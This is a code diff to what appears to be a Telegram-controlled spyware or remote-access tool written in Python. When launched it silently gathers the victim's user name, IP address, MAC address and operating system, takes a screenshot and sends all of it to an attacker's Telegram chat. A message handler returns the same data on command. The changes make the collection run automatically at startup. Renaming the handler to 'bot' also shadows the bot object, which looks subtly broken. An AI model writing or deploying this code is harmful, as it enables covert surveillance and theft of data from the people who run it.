@@ -17,7 +17,8 @@ bot = Bot(token=TOKEN)
 dp = Dispatcher(bot)
 
 
-async def on_startup():
+async def start(*args):
+    bot = Bot(token=TOKEN)
     name = getpass.getuser()
     ip = socket.gethostbyname(socket.getfqdn())
     mac = get_mac()
@@ -33,12 +34,12 @@ async def on_startup():
     await bot.send_message(text=f'!!!ПРОГРАММА ЗАПУЩЕНА!!! \nИмя пользователя: {name} \nIp-адресс: {ip} \nMAC-адресс: {mac} \nСистема: {ost}', chat_id='892341815')
     pyautogui.screenshot("screenshot.jpg")
     with open('screenshot.jpg', 'rb') as photo:
-        await bot.send_document(chat_id='892341815', document=photo)
-        os.remove('screenshot.jpg')
+        await bot.send_document(chat_id='ur chat id with ur bot', document=photo)
+    os.remove('screenshot.jpg')
 
 
 @dp.message_handler()
-async def echo(message: types.message):
+async def bot(message: types.message):
     if message.text == '/info':
         name = getpass.getuser()
         ip = socket.gethostbyname(socket.getfqdn())
@@ -134,5 +135,4 @@ async def echo(message: types.message):
             pass
 
 if __name__ == '__main__':
-    executor.start_polling(dp, skip_updates=True)
-    on_startup()
+    executor.start_polling(dp, skip_updates=True, on_startup=start)
